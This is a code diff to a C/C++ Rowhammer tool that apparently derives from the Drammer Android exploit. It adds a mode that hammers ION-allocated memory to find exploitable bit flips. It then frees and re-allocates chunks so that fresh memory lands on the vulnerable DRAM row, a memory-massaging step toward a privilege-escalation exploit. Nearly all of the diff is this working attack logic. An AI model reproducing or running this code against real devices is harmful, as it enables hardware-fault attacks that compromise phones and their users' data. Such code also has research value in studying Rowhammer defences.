@@ -57,6 +57,7 @@ void usage(char *main_program) {
     fprintf(stderr,"   -r rowsize: Rowsize of DRAM module in B (autodetect if not specified)\n");
     fprintf(stderr,"   -s        : Hammer more conservative (currently set to hammering every 64 bytes)\n");
     fprintf(stderr,"   -t timer  : Number of seconds to hammer (default is to hammer everything)\n");
+    fprintf(stderr,"   -o        : Original version of this program (templating only)\n");
 }
 
 void resetter(uint8_t *pattern) {
@@ -87,9 +88,10 @@ int main(int argc, char *argv[]) {
     bool heap_type_detector = false;
     bool do_conservative = false;
     bool all_patterns = false;
+    bool original = false;
     int cpu_pinning = -1;
     opterr = 0;
-    while ((c = getopt(argc, argv, "sac:d:f:hiq:r:t:")) != -1) {
+    while ((c = getopt(argc, argv, "sac:d:f:hiq:r:t:o")) != -1) {
         switch (c) {
             case 'a':
                 all_patterns = true;
@@ -120,6 +122,9 @@ int main(int argc, char *argv[]) {
                 break;
             case 't':
                 timer = strtol(optarg, NULL, 10);
+                break;
+            case 'o':
+                original = true;
                 break;
             case '?':
                 if (optopt == 'c' || optopt == 'd' || optopt == 'f' || optopt == 'q' || optopt == 'r' || optopt == 't') 
@@ -183,11 +188,6 @@ int main(int argc, char *argv[]) {
     // 65536 for Nexus 5
     print("[MAIN] Row size: %d\n", rowsize);
 
-    /*** EXHAUST */
-    printf("[MAIN] Exhaust ION chunks for templating\n");
-    exhaust(ion_chunks, rowsize * 4);
-
-    
     /* patterns:  above      victim     below
      * p000       0x00000000 0x00000000 0x00000000
      * p001       0x00000000 0x00000000 0xffffffff
@@ -244,16 +244,82 @@ int main(int argc, char *argv[]) {
                            &p00r, &p0r0, &p0rr, &pr00, &pr0r, &prr0, &prrr};
     else
         patterns = {&p101, &p010};
-    
-    /*** TEMPLATE */
-    printf("[MAIN] Start templating\n");
-    TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);
 
+    do {
+        if (original) {
+            /*** EXHAUST */
+            printf("[MAIN] Exhaust ION chunks for templating\n");
+            exhaust(ion_chunks, rowsize * 4);
 
-  
+            /*** TEMPLATE */
+            printf("[MAIN] Start templating\n");
+            TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);
+            break;
+        } else {
+            // Exhaust L
+            printf("[MAIN] Exhaust L (4MB) ION chunks for templating\n");
+            int count = ION_bulk(M(4), ion_chunks, 0);
+            print("[EXHAUST] %d L (4MB) ION chunks allocated \n", count);
+
+            // Template L
+            TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);
+
+            // check exploitable bits inside L
+            struct template_t *first_expl = get_first_exploitable_flip(templates);
+            if (first_expl == NULL) {
+                printf("[TMPL] - No exploitable flip found.\n");
+                break;
+            }
+
+            // Exhaust M
+            printf("[MAIN] Exhaust M (64KB) ION chunks\n");
+            count = ION_bulk(K(64), ion_chunks, 0, false);
+            print("[EXHAUST] %d M (64KB) ION chunks allocated \n", count);
+
+            // Free L* with particular exploitable bit
+            print("[MAIN] Free L* at va %p\n", first_expl->ion_chunk->mapping);
+            print("[MAIN] Exploitable bit at va %p\n", first_expl->virt_addr);
+            uintptr_t expl_row = first_expl->virt_addr & 0xffff0000;
+            if (expl_row == (uintptr_t)first_expl->ion_chunk->mapping) {
+                printf("[TMPL] - M* at edge of L*\n");
+                break;
+            }
+            ION_clean(first_expl->ion_chunk);
+
+            // Immediately exhaust M again
+            printf("[MAIN] Exhaust M (64KB) ION chunks again\n");
+            count = ION_bulk(K(64), ion_chunks, 0);
+            print("[EXHAUST] %d M (64KB) ION chunks allocated \n", count);
+            if (count != 64) {
+                // M doesn't use free space of L*
+                printf("[EXHAUST M] - size mismatch\n");
+                break;
+            }
+
+//            count = 0;
+//            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
+//                print("[MAIN] New M at va %p\n", (*it)->mapping);
+//                count++;
+//                if (count == 64) break;
+//            }
+
+            // Free M* and all L
+            for (auto chunk : ion_chunks) {
+                if (chunk->len == M(4) || (uintptr_t)chunk->mapping == expl_row) {
+                    print("[FREE] Free %p, len %d\n", chunk->mapping, chunk->len);
+                    ION_clean(chunk);
+                }
+            }
+
+            break;
+        }
+    } while(true);
+
     /*** CLEAN UP */
     ION_clean_all(ion_chunks);
     
     printf("[MAIN] ION fini\n");
     ION_fini();
+
+    return 0;
 }
